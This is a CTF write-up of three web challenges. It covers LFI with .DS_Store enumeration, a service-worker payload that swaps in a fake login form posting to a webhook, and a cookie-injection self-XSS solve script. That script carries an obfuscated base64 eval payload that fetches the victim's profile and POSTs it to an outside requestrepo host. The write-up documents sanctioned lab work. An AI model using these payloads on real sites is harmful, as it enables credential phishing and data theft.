## Apfel Seite [9]

> This challenge was fuelled by C17H21NO4 and insomnia. I'm sorry.

The challenge immediately presents us with a blatant LFI vulnerability; clicking one of the links on the navbar navigates you to `http://apfel-seite.zajebistyc.tf/?apfel_selection=apfels/rotten/description.txt` for example, where `apfel_selection` is the vulnerable parameter. From here, we can get the index.php source code with `?apfel_selection=index.php`:

```php
<?php
if (isset($_GET["apfel_selection"]) && file_exists($_GET["apfel_selection"])) {
  if (strpos($_GET["apfel_selection"], "..") !== false) {
    echo "<h1><b1>SIRüëÄ THIS IS AN APFELüçéüçé STOREüí≤ PLEASE DO NOT üòîHACKüòî US üôèüôè</h1></b1>";
  } else {
    echo file_get_contents($_GET["apfel_selection"]);
  }
} else {
  $jokes = array(
    "What kind of apple isn‚Äôt an apple?<br><b>A pineapple.</b>",
    "What do you call a person who saw an apple store getting robbed?<br><b>An iWitness.</b>",
    "Why did the apple turn red?<br><b>Because it saw the salad dressing.</b>",
    "What‚Äôs the best thing to put into an apple pie?<br><b>Your teeth.</b>",
    "What is a math teacher‚Äôs favourite dessert?<br><b>Apple Pi.</b>",
    "Why don‚Äôt robots like Apples?<br><b>Because They‚Äôre androids!</b>",
    "What happened to the newly wedded apples?<br><b>They lived apple-ly ever after</b>"
  );
  echo $jokes[array_rand($jokes)];
  echo "üòÇü§£";
}
?>
```

Here we can see that our input is passed through `file_exists`, then if that works, `file_get_contents`. Where's the flag? This line on the index page tells us:

```Welcome to apfel-seite. We are here for all your üÖ∞Ô∏èpfel needs. Lorem ipsum... just kidding!üòÇüòÇü§£ü§£ Please use the buttons above to view our excellent offer of different kinds of üÖ∞Ô∏èpfels. PS: since we're in the üÖ∞Ô∏èpple-business we only use computers provided by our official sponsorüòé. Oh you're just here for the flag? Too bad! It's hidden somewhere in the webroot but I'm not gonna tell you whereü§£```

This hints that we should be using .DS_Store files, which may store metadata about the files in the webroot directory that could lead to the flag's filename! `http://apfel-seite.zajebistyc.tf/?apfel_selection=.DS_Store` has nothing useful, but `http://apfel-seite.zajebistyc.tf/?apfel_selection=apfels/.DS_Store` has an interesting list of names. I used [this tool by gehaxelt](https://github.com/gehaxelt/Python-dsstore) to parse the .DS_Store files. Iterating through the list of directory names and comparing the `description.txt` files in each will yield one that differs from all the others (limbertwig), which reveals the flag's filename in `http://apfel-seite.zajebistyc.tf/?apfel_selection=apfels/limbertwig/.DS_Store`, and finally the flag in `http://apfel-seite.zajebistyc.tf/?apfel_selection=apfels/limbertwig/flag_but_without_an_obvious_filename.txt`.

## v [5]

> Anonymous, it's time to pull out your nessus and LOIC to protect humanity!

This challenge concerns a defaced website where you can upload files. The files are stored in the `files` directory and are accessible at `https://v.zajebistyc.tf/<filename>`, and we can easily test and verify that we can upload a .html file and have any JS that we want execute. The twist in this challenge is the order in which the admin bot does things:

```js
await page.goto(url);
await sleep(5000);
await page.close();
console.log(`visiting ${url} done, closed page`);

// open new page to clear any XSS payloads before logging in
page = await context.newPage();

console.log("opening new page");
await Promise.all([
  page.waitForNavigation({ waitUntil: 'load' }),
  page.goto(LOGIN_URL),
]);
console.log("content loaded");
await page.waitForSelector('#username');
console.log('got selector');
await page.$eval('#username', (el, val) => { el.value = val; }, BOT_USER);
await page.$eval('#password', (el, val) => { el.value = val; }, BOT_PASS);
await page.click('#submit');
console.log("clicked");
await sleep(5000);
console.log(`visiting login done, closed page`);
```

Our malicious page is visited then closed *before* the admin logs in, and we want the admin's login details. This means that any JS which lives strictly while the page is open won't work. What will work, however, are service workers!

Paraphrasing the [mozilla](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API/Using_Service_Workers) description, service workers improve the offline user experience by allowing for developers to more finely control the cache. For example, losing internet with service workers should mean that you can navigate between pages you've visited already (if they're cached) even while offline. From a design perspective, service workers have to work between pages in order for the scripts not to stop working after navigations, like traditional JS scripts would. Here however, service workers allow us to create JS that stays alive even after our page is closed. All we have to do is create some file `sw.js` that intercepts any following network requests and responds with our own custom form:

```js
self.addEventListener('fetch', e => {
    e.respondWith(
        new Response(`
            <form action=WEBHOOK>
                <input id=username name=username type=text>
                <input id=password name=password type=text>
                <input id=submit type=submit>
            </form>
        `)
    );
});
```

Then we just need to register this service worker:

```html
<script>
navigator.serviceWorker.register("FILENAME.js");
</script>
```

Uploading the first file will yield the filename, then we can upload the second file and send the admin to that file. When they go to the "login page", the form they enter details into will actually send their details to our webhook, which we can then extract the username and password from to log in as them.

```
username: initial_ducc
password: https://www.youtube.com/watch?v=sHgeidTpd1E
```

Bingo!

## The Real Monster [5]

This was my favourite web challenge. It's sourceless, but we can get somewhere pretty easily. Just trying any sort of markup injection in the username field works, i.e:

```
username: <b>hi</b>
```

...and there's no CSP either, so we have a winning self-XSS. If we can get the admin to log in as us and go to `/profile`, then we can execute any JS we want. However, this isn't as useful as it seems, due to these following issues:

- Logging in as us will override the admin's `credentials` cookie, which stores our username and password as raw JSON: `{"username":"<b>hi</b>","password":"aaa"}`, thus, we'd lose the admin's login and be unable to fetch their secret
- Popups don't work for some reason (I'm pretty certain that puppeteer had popups disabled?) so we aren't able to extend our browsing context to another window
- `credentials` defaults to `SameSite=Lax`, which means that we can't set the cookie cross-origin with CSRF as browsers only honour `Set-Cookie` headers with `SameSite=None` if the request isn't top level; and again, we can't make it top level as we can't extend our browsing context to other windows

This seems pretty tough, so let's investigate `credentials` in more detail, as it's pretty suspicious that this plaintext cookie is being used instead of the default `session` cookie from Flask. Indeed, our JSON input isn't escaped, so we can escape the JSON and inject arbitrary Set-Cookie attributes, eg:

```
username: user":"pass"};SameSite;
password: lol

/\ will result in the cookie looking like:

credentials={"user":"pass"};SameSite;"lol"}
```

The key things to note here are that we can set `SameSite=None; Secure;` (Secure is needed if SameSite=None) in order to allow us to set our forged cookie, and that we can avoid overriding the admin's `credentials` cookie by setting our cookie on a different path! For example, these following attributes would make it possible for our `credentials` to be sent cross-frame and only when the path is `/.%2Fprofile`:

```
SameSite=None; Secure; Path=/.%2Fprofile; <garbage here>
```

...and thanks to Flask's routing, the %2F will be decoded to a slash *before* routing rules are applied, so will be treated as `/./profile` and access the same page as `/profile` without contesting with the admin's `credentials` cookie. Our path is clear:

- CSRF a login with our username and injected attributes, `<XSS PAYLOAD>","pwd"}; SameSite=None; Secure; Path=/.%2Fprofile;`, so the response `Set-Cookie` header will set a cookie that only applies on `/.%2Fprofile`
- Redirect (key: redirect, not frame, as framing will fail to send the admin's cookie due to SameSite=Lax) to `/.%2Fprofile`

Here's my cleaned-up solve script:

```html
<!DOCTYPE html>
<html>
<head>
</head>
<body>

<iframe name=woo id=woo></iframe>

<!-- Targeting the iframe here is necessary as popups are blocked -->
<form id=form action="https://ctftime.pl/login" method="POST" target="woo">
    <input name=username id=uname>
    <input name=password value=pwdpwd>
    <input type=submit>
</form>

<script>
onload = async () => {

    `setTimeout(async ()=>{
        fetch('https://w6bcg3ji.requestrepo.com');
        p = await fetch('https://ctftime.pl/profile').then(r => r.text());
        fetch('https://w6bcg3ji.requestrepo.com',{method:'POST',body:p})
    },500)

    b64 encoded`

    document.getElementById("uname").value = `<script>eval(atob('c2V0VGltZW91dChhc3luYyAoKT0+ewoJCWZldGNoKCdodHRwczovL3c2YmNnM2ppLnJlcXVlc3RyZXBvLmNvbScpOwoJCXAgPSBhd2FpdCBmZXRjaCgnaHR0cHM6Ly9jdGZ0aW1lLnBsL3Byb2ZpbGUnKS50aGVuKHIgPT4gci50ZXh0KCkpOwoJCWZldGNoKCdodHRwczovL3c2YmNnM2ppLnJlcXVlc3RyZXBvLmNvbScse21ldGhvZDonUE9TVCcsYm9keTpwfSkKCX0sNTAwKQ=='))<\/script>","password":"pwdpwd"};Path=/.%2Fprofile;Abc=`;
    document.getElementById("form").submit();

    // wait for a response
    await new Promise(r => setTimeout(r, 500));

    location = "https://ctftime.pl/.%2Fprofile";
}
</script>
</body>
</html>
```

The intended solution was to use `Max-Age` instead of `Path` to create a cookie that immediately expires, such that you can navigate to `/profile` the first time with your forged cookie, then XSS a request to `/profile` again with the admin's cookie. Both follow the same general concept.

Once again, thank you to p4 for some great web challenges, and thank you for reading!
